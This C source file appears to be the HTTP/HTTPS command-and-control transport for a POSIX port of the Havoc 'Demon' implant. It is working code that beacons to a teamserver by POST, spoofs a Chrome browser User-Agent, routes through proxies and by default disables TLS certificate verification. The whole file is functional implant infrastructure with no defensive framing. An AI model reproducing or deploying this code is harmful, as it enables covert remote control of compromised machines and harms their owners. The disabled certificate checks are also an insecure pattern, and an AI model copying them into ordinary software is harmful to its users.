/*
 * Transport.c — HTTP/HTTPS C2 transport for the POSIX Demon agent.
 *
 * Uses libcurl for HTTP/HTTPS so the agent works on both Linux and macOS
 * without writing raw TLS code. libcurl is available on both platforms
 * either via the system package manager or Homebrew.
 *
 * The function signatures mirror TransportHttp.c from the Windows Demon.
 */

#include "DemonPosix.h"
#include <curl/curl.h>
#include <stdlib.h>
#include <string.h>

/* ── Response accumulation buffer ────────────────────────────────────── */
typedef struct {
    uint8_t *data;
    size_t   size;
} CurlBuf;

static size_t curl_write_cb(void *contents, size_t size, size_t nmemb, void *userp)
{
    size_t    realsize = size * nmemb;
    CurlBuf  *buf      = (CurlBuf *)userp;
    uint8_t  *ptr      = (uint8_t *)realloc(buf->data, buf->size + realsize);
    if (!ptr) return 0; /* out of memory — curl will abort */
    buf->data  = ptr;
    memcpy(buf->data + buf->size, contents, realsize);
    buf->size += realsize;
    return realsize;
}

/* ── Module-level curl handle (reused across calls) ─────────────────── */
static CURL             *g_curl      = NULL;
static struct curl_slist *g_headers  = NULL;

/* ── Build the URL from transport config ─────────────────────────────── */
static void build_url(char *out, size_t out_sz)
{
    HTTP_CONFIG *h = &DemonInstance->Transport.Http;
    const char  *scheme = h->Ssl ? "https" : "http";

    if ((h->Ssl && h->Port == 443) || (!h->Ssl && h->Port == 80)) {
        snprintf(out, out_sz, "%s://%s%s", scheme, h->Host,
                 h->Uri ? h->Uri : "/");
    } else {
        snprintf(out, out_sz, "%s://%s:%u%s", scheme, h->Host, h->Port,
                 h->Uri ? h->Uri : "/");
    }
}

/* ── Init ────────────────────────────────────────────────────────────── */
int TransportHttpInit(void)
{
    if (curl_global_init(CURL_GLOBAL_ALL) != CURLE_OK) return -1;

    g_curl = curl_easy_init();
    if (!g_curl) return -1;

    HTTP_CONFIG *h = &DemonInstance->Transport.Http;

    /* User-Agent */
    const char *ua = h->UserAgent
                   ? h->UserAgent
                   : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                     "AppleWebKit/537.36 (KHTML, like Gecko) "
                     "Chrome/112.0.0.0 Safari/537.36";
    curl_easy_setopt(g_curl, CURLOPT_USERAGENT, ua);

    /* Custom headers */
    g_headers = NULL;
    for (size_t i = 0; i < h->HeaderCount; i++) {
        g_headers = curl_slist_append(g_headers, h->Headers[i]);
    }
    /* Always add Content-Type for POST */
    g_headers = curl_slist_append(g_headers, "Content-Type: application/octet-stream");
    curl_easy_setopt(g_curl, CURLOPT_HTTPHEADER, g_headers);

    /* TLS certificate verification.
     *
     * The Havoc teamserver uses a self-signed certificate generated at
     * runtime, so standard CA chain verification will always fail.
     * We disable peer and host verification — same behaviour as the
     * Windows Demon which uses WinHTTP without certificate validation.
     *
     * If CONFIG_SSL_FINGERPRINT is defined at compile time we instead
     * pin to that exact SHA-256 fingerprint for stronger security:
     *   -DCONFIG_SSL_FINGERPRINT=\"sha256//base64...\"
     */
#ifdef CONFIG_SSL_FINGERPRINT
    curl_easy_setopt(g_curl, CURLOPT_SSL_VERIFYPEER, 1L);
    curl_easy_setopt(g_curl, CURLOPT_SSL_VERIFYHOST, 2L);
    curl_easy_setopt(g_curl, CURLOPT_PINNEDPUBLICKEY, CONFIG_SSL_FINGERPRINT);
#else
    /* Default: accept any certificate (self-signed teamserver cert) */
    curl_easy_setopt(g_curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(g_curl, CURLOPT_SSL_VERIFYHOST, 0L);
#endif

    /* Proxy */
    if (h->ProxyUrl) {
        curl_easy_setopt(g_curl, CURLOPT_PROXY, h->ProxyUrl);
    }

    /* Response callback */
    curl_easy_setopt(g_curl, CURLOPT_WRITEFUNCTION, curl_write_cb);

    /* Follow redirects */
    curl_easy_setopt(g_curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(g_curl, CURLOPT_MAXREDIRS, 5L);

    /* Timeout (seconds) */
    curl_easy_setopt(g_curl, CURLOPT_TIMEOUT, 30L);

    return 0;
}

void TransportHttpCleanup(void)
{
    if (g_headers) { curl_slist_free_all(g_headers); g_headers = NULL; }
    if (g_curl)    { curl_easy_cleanup(g_curl);       g_curl    = NULL; }
    curl_global_cleanup();
}

/* ── Send a POST request and receive the response ─────────────────────
 *
 * TransportSendRecv — the single entry point for all C2 I/O.
 *
 * Sends `request` bytes via HTTP POST and populates *response /
 * *resp_len with the server's reply (caller must free(*response)).
 *
 * Returns 0 on success, -1 on failure.
 */
int TransportSendRecv(const uint8_t *request,  size_t   req_len,
                      uint8_t      **response,  size_t  *resp_len)
{
    if (!g_curl || !request || !response || !resp_len) return -1;

    char url[2048];
    build_url(url, sizeof(url));

    CurlBuf resp_buf = { .data = NULL, .size = 0 };

    curl_easy_setopt(g_curl, CURLOPT_URL, url);
    curl_easy_setopt(g_curl, CURLOPT_POST, 1L);
    curl_easy_setopt(g_curl, CURLOPT_POSTFIELDS,    (const char *)request);
    curl_easy_setopt(g_curl, CURLOPT_POSTFIELDSIZE, (long)req_len);
    curl_easy_setopt(g_curl, CURLOPT_WRITEDATA, &resp_buf);

    CURLcode res = curl_easy_perform(g_curl);
    if (res != CURLE_OK) {
        DEMON_LOG("curl_easy_perform() failed: %s", curl_easy_strerror(res));
        if (resp_buf.data) free(resp_buf.data);
        return -1;
    }

    long http_code = 0;
    curl_easy_getinfo(g_curl, CURLINFO_RESPONSE_CODE, &http_code);
    if (http_code != 200) {
        DEMON_LOG("HTTP error: %ld", http_code);
        if (resp_buf.data) free(resp_buf.data);
        return -1;
    }

    *response = resp_buf.data;
    *resp_len = resp_buf.size;
    return 0;
}
